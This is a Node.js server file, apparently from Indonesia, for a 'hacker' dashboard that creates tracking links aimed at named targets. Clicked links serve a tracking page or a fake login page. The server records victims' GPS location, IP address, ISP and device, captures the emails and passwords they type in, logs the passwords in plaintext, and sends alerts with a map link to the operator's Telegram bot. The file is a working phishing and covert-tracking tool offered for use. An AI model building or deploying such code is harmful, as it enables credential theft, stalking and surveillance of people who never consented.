// File: server.js (v6.3 - Hybrid Integrated Final)

require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const UAParser = require('ua-parser-js');
const { nanoid } = require('nanoid');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const db = require('./db');
const requestIp = require('request-ip');
const axios = require('axios');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = process.env.PORT || 4000;

const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';

// ================== MIDDLEWARE ================== //
app.use(cors());
app.use(express.json());
app.use(requestIp.mw());
app.use(express.static(__dirname));

// ================== MIDDLEWARE PROTEKSI RUTE ================== //
const protectRoute = (req, res, next) => {
    try {
        const token = req.headers.authorization?.split(" ")[1];
        if (!token) {
            return res.status(401).json({ message: 'Akses ditolak. Token tidak ada.' });
        }
        
        jwt.verify(token, JWT_SECRET, (err, decoded) => {
            if (err) {
                return res.status(401).json({ message: 'Token tidak valid.' });
            }
            req.user = decoded;
            next();
        });
    } catch (error) {
        res.status(401).json({ message: 'Token tidak valid atau error.' });
    }
};

// ================== HELPER FUNCTIONS & SOCKET.IO ================== //
const sendTelegramNotification = async (locationData) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi dilewati.');
        return;
    }

    const {
        username, ip_address, city, country, isp, org, proxy,
        browserInfo, osInfo, latitude, longitude
    } = locationData;

    const message = `
*💀 Target Terdeteksi! 💀*

*Target ID:* \`${username}\`
*IP Address:* \`${ip_address}\`
*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
*Provider:* ${isp || 'N/A'} (${org || 'N/A'})
*Proxy/VPN:* ${proxy ? 'Ya' : 'Tidak'}

*Perangkat:* ${browserInfo} pada ${osInfo}

*Lihat di Peta:*
[Google Maps](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await axios.post(url, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('✅ Notifikasi Telegram berhasil dikirim.');
    } catch (error) {
        console.error('❌ Gagal mengirim notifikasi Telegram:', error.response ? error.response.data : error.message);
    }
};

const broadcastDashboardUpdate = async (socket = null) => {
    try {
        const [links] = await db.promise().query(`SELECT l.id, l.original_url, l.created_at, l.expires_at, l.link_type, u.username, l.click_count, l.last_clicked_at, last_loc.city, last_loc.country FROM links l JOIN users u ON l.user_id = u.id LEFT JOIN (SELECT tracker_id, city, country, ROW_NUMBER() OVER (PARTITION BY tracker_id ORDER BY created_at DESC) as rn FROM locations) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1 ORDER BY l.created_at DESC`);
        const [stats] = await db.promise().query(`SELECT (SELECT COUNT(*) FROM links) as total_links, (SELECT SUM(click_count) FROM links) as total_clicks, (SELECT COUNT(*) FROM locations) as total_locations`);
        const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
        const parser = new UAParser();
        const browserStats = locations.reduce((acc, loc) => {
            if (loc.user_agent) {
                const browserName = parser.setUA(loc.user_agent).getBrowser().name || "Unknown";
                acc[browserName] = (acc[browserName] || 0) + 1;
            }
            return acc;
        }, {});

        // Ambil data kredensial dari database
        const [credentials] = await db.promise().query(`
            SELECT 
                c.id, c.tracker_id, c.email, c.password, c.ip_address, c.created_at, u.username
            FROM credentials c
            JOIN links l ON c.tracker_id = l.id
            JOIN users u ON l.user_id = u.id
            ORDER BY c.created_at DESC
        `);

        const data = { links, stats: stats[0], browserStats, credentials };
        const emitter = socket || io;
        emitter.emit('dashboard_update', data);

    } catch (error) {
        console.error("❌ Gagal broadcast update:", error);
    }
};

const broadcastLogMessage = (message) => {
    const timestamp = new Date().toLocaleTimeString('id-ID');
    io.emit('new_log_message', `[${timestamp}] ${message}`);
};

io.on('connection', (socket) => {
    console.log('🔌 Klien baru terhubung via WebSocket');
    socket.on('request_initial_data', (payload) => {
        try {
            const token = payload.token;
            if (!token) return;
            jwt.verify(token, JWT_SECRET, (err, decoded) => {
                if (err) {
                    console.log('🔒 Token tidak valid dari klien soket.');
                    return;
                }
                console.log(`✅ Klien terotentikasi (${decoded.username}), mengirim data awal.`);
                broadcastDashboardUpdate(socket);
            });
        } catch (error) {
            console.error('Error pada event request_initial_data:', error);
        }
    });
    socket.on('disconnect', () => {
        console.log('🔌 Klien terputus');
    });
});

// ================== RUTE PUBLIK (LOGIN & HALAMAN UTAMA) ================== //
app.get('/', (req, res) => {
    res.redirect('/login.html');
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const [users] = await db.promise().query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
        if (users.length === 0) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const admin = users[0];
        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const token = jwt.sign({ userId: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '8h' });
        res.json({ message: 'Login berhasil!', token });
    } catch (error) {
        console.error("Error saat login:", error);
        res.status(500).json({ message: 'Server error' });
    }
});

// ================== RUTE LINK KLIK & LOG (TETAP PUBLIK) ================== //
app.get('/:id', async (req, res) => {
    const { id } = req.params;
    const userAgentString = req.headers['user-agent'];
    
    try {
        const [links] = await db.promise().query(`SELECT l.original_url, l.url_android, l.url_ios, l.expires_at, u.username, l.link_type FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
        
        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
        
        const { original_url, url_android, url_ios, expires_at, username, link_type } = links[0];
        
        if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
        
        const parser = new UAParser(userAgentString);
        const os = parser.getOS().name;
        
        let destinationUrl = original_url;
        if (os === 'Android' && url_android) {
            destinationUrl = url_android;
        } else if (os === 'iOS' && url_ios) {
            destinationUrl = url_ios;
        }

        if (link_type === 'direct') {
            fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
                if (fsErr) return res.status(500).send('Server error');
                const html = data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username);
                res.send(html);
            });
        } else if (link_type === 'intermediate') {
            fs.readFile(path.join(__dirname, 'login_users.html'), 'utf8', (fsErr, data) => {
                if (fsErr) return res.status(500).send('Server error');
                const html = data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username);
                res.send(html);
            });
        } else {
            res.status(404).send('<h1>404 Not Found</h1>');
        }

    } catch (error) {
        console.error("Error handling link click:", error);
        res.status(500).send('Server error');
    }
});

app.post('/log', async (req, res) => {
    const { latitude, longitude, trackerId, username } = req.body;
    const userAgentString = req.headers['user-agent'];
    const ipAddress = req.clientIp;
    try {
        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
        
        let country = null, city = null, isp = null, org = null, proxy = false;
        try {
            const apiKey = process.env.OPENCAGE_API_KEY;
            if (apiKey) {
                const geoUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
                const geoResponse = await axios.get(geoUrl);
                const components = geoResponse.data.results[0]?.components;
                if (components) {
                    country = components.country;
                    city = components.city || components.town || components.village || components.state_district;
                }
            }
            const ipUrl = `http://ip-api.com/json/${ipAddress}?fields=status,message,isp,org,proxy`;
            const ipResponse = await axios.get(ipUrl);
            if (ipResponse.data.status === 'success') {
                isp = ipResponse.data.isp;
                org = ipResponse.data.org;
                proxy = ipResponse.data.proxy;
            }
        } catch (apiError) {
            console.error("❌ Gagal memanggil API eksternal:", apiError.message);
        }
        
        const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city, isp, org, proxy };
        await db.promise().query('INSERT INTO locations SET ?', newLocation);

        await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [trackerId]);
        
        const parser = new UAParser(userAgentString);
        const ua = parser.getResult();
        const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
        const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
        const locationInfo = city ? `from ${city}, ${country}` : '';
        
        broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);

        const notificationData = { ...newLocation, username, browserInfo, osInfo };
        await sendTelegramNotification(notificationData);

        broadcastDashboardUpdate();
        const newLocationDataForMap = { ...newLocation, username };
        io.emit('new_location_logged', newLocationDataForMap);
        
        res.json({ status: 'success' });
    } catch (error) {
        console.error("Error logging location:", error);
        res.status(500).json({ status: 'error' });
    }
});

app.post('/api/credentials', async (req, res) => {
    const { email, password, trackerId } = req.body;
    const ipAddress = req.clientIp;
    
    console.log(`🔒 Kredensial ditangkap! Email: ${email}, Password: ${password}, Link ID: ${trackerId}, IP: ${ipAddress}`);
    broadcastLogMessage(`> Kredensial ditangkap dari link [${trackerId}] | Email: ${email} | IP: ${ipAddress}`);
    
    try {
        await db.promise().query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
        res.status(200).json({ message: 'Credentials logged successfully.' });
        broadcastDashboardUpdate();
    } catch (error) {
        console.error('❌ Gagal menyimpan kredensial:', error);
        res.status(500).json({ message: 'Error saving credentials.' });
    }
});

// ================== API YANG DIPROTEKSI ================== //
app.post('/create', protectRoute, async (req, res) => {
    const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
    
    if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
    
    let expiresAt = null;
    if (expiresIn && !isNaN(parseInt(expiresIn))) {
        expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
    }

    try {
        let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        let userId;
        if (users.length > 0) {
            userId = users[0].id;
        } else {
            const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
            userId = result.insertId;
        }

        const id = nanoid(8);
        const newLinkData = {
            id,
            user_id: userId,
            original_url: originalUrl,
            url_android: url_android || null,
            url_ios: url_ios || null,
            expires_at: expiresAt,
            link_type: linkType || 'direct'
        };

        await db.promise().query('INSERT INTO links SET ?', newLinkData);
        
        broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
        broadcastDashboardUpdate();
        res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
    } catch (error) {
        console.error("Error creating link:", error);
        res.status(500).json({ error: 'DB error' });
    }
});

app.delete('/api/links/:id', protectRoute, async (req, res) => {
    const { id } = req.params;
    try {
        await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
        broadcastLogMessage(`> Link [${id}] has been deleted.`);
        broadcastDashboardUpdate();
        res.json({ status: 'success', message: 'Link berhasil dihapus.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
    }
});

app.get('/api/locations', protectRoute, async (req, res) => {
    try {
        const [rows] = await db.promise().query(`
            SELECT l.*, u.username
            FROM locations l 
            JOIN users u ON l.user_id = u.id 
            ORDER BY l.created_at DESC
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
    const { trackerId } = req.params;
    try {
        const [locations] = await db.promise().query(`SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
        const parser = new UAParser();
        const parsedLocations = locations.map(loc => {
            const ua = parser.setUA(loc.user_agent || '').getResult();
            const deviceType = ua.device.type || (ua.os.name === 'iOS' || ua.os.name === 'Android' ? 'mobile' : 'desktop');
            return {
                ...loc,
                browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown',
                os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown',
                device: {
                    type: deviceType,
                    vendor: ua.device.vendor || 'Unknown',
                    model: ua.device.model || 'N/A'
                }
            };
        });
        res.json(parsedLocations);
    } catch (error) {
        console.error(`❌ Gagal mengambil data lokasi untuk ${trackerId}:`, error);
        res.status(500).json({ error: 'DB error' });
    }
});


// ================== RUN SERVER ================== //
server.listen(PORT, () => {
    console.log(`\n HACKER-UI DASHBOARD v6.3 (Final)`);
    console.log(`===================================================`);
    console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
});